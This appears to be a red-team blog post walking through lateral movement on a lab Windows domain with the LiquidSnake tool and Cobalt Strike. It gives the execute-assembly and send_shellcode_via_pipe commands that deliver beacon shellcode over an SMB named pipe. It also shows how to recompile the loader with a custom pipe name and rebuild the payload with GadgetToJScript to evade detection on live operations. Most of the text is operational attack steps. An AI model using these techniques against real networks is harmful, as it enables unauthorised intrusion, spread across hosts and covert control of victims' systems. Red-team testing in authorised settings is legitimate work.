---
layout: post
title: Lateral Movement with LiquidSnake
subtitle: Playing with Cobalt Strike and LiquidSnake
thumbnail-img: /assets/posts/liquidsnake/thumb.png
share-img: /assets/posts/liquidsnake/thumb.png
tags: [cobalt strike, liquidsnake, lateral movement]
---

[LiquidSnake](https://github.com/RiccardoAncarani/LiquidSnake) is a recently released lateral movement tool, using [WMI event subscription](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/) and SMB named pipes for shellcode transfer. The author, [@dottor_morte](https://twitter.com/dottor_morte), has also provided a Cobalt Strike aggressor script for easy integration with beacon.

# Testing Vanilla LiquidSnake
Without modifying the LiquidSnake solution, set the target architecture to `x64` and build - this will be our `execute-assembly` target from beacon.

I've got a beacon running on a Windows 10 system in my lab environment, we'll be using this as the starting point for lateral movement.

![Initial beacon](/assets/posts/liquidsnake/init_beacon.png){: .mx-auto.d-block :}

Using the user context (`REDANIA\vizimir`) already established in beacon, we'll test moving to `oxenfurt.redania.local`. This can be accomplished with beacon's `execute-assembly` function (or better yet, [BOF.NET](https://github.com/CCob/BOF.NET/pull/1)) and the compiled LiquidSnake binary:
~~~
execute-assembly /opt/aggressor/LiquidSnake.exe oxenfurt.redania.local
~~~

![LiquidSnake](/assets/posts/liquidsnake/snake.png){: .mx-auto.d-block :}

Make sure to wait for the full output to be received before continuing - during this time the WMI event sub is being created and subsequently trigged. Once triggered, the target host will be listening on a SMB named pipe for shellcode to be executed. By default, the named pipe used is `\\.\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7`. We'll come back to this value later.

The author has a [BOF](https://github.com/RiccardoAncarani/BOFs/tree/master/send_shellcode_via_pipe) and aggressor script which can be used to deliver our beacon shellcode to the listening pipe. I've generated some stageless beacon shellcode tied to the HTTPS listener to send. First, load up the aggressor script:
![Aggressor Script](/assets/posts/liquidsnake/import_aggressorscript.png){: .mx-auto.d-block :}

Deliver the shellcode:
~~~
send_shellcode_via_pipe \\oxenfurt\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7 /opt/aggressor/beacon.bin
~~~
![Send Shellcode](/assets/posts/liquidsnake/send_shellcode.png){: .mx-auto.d-block :}

And there's our new beacon on the target:
![New Beacon](/assets/posts/liquidsnake/new_beacon.png){: .mx-auto.d-block :}

# Customizing the Named Pipe
If we're to use LiquidSnake on a live operation, we'll likely want to change to named pipe to better blend in. To do this, we'll have to recompile the `CSharpNamedPipeLoader` solution from the LiquidSnake repo.

In `Program.cs` on line `410`, set the pipe name to your preferred value:
~~~csharp
IntPtr hPipe = CreateNamedPipe("\\\\.\\pipe\\MyNewPipeName")
~~~

Make sure the project architecture is set to `x64` and compile. To work the edit into LiquidSnake, [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) is used:
![GadgetToJScript](/assets/posts/liquidsnake/gadgettojscript.png){: .mx-auto.d-block :}

Base64 up the resulting `test.vbs` file:
![Base64 VBS](/assets/posts/liquidsnake/b64_gadget.png){: .mx-auto.d-block :}

Paste that string into the LiquidSnake solution in `Program.cs` on line `29`:
~~~csharp
string vbscript64 = "RnVuY3Rbpb24gQmFzZTY0VG9..."
~~~

Recompile the project and it's back over to Cobalt Strike. Repeat the previously used beacon commands, except this time sub in your custom named pipe value when running `send_shellcode_via_pipe`:
![Modded LiquidSname](/assets/posts/liquidsnake/modded_snake_exec.png){: .mx-auto.d-block :}

And we receive our third beacon, this one using the custom pipe name:
![Third Beacon](/assets/posts/liquidsnake/3rd_beacon.png){: .mx-auto.d-block :}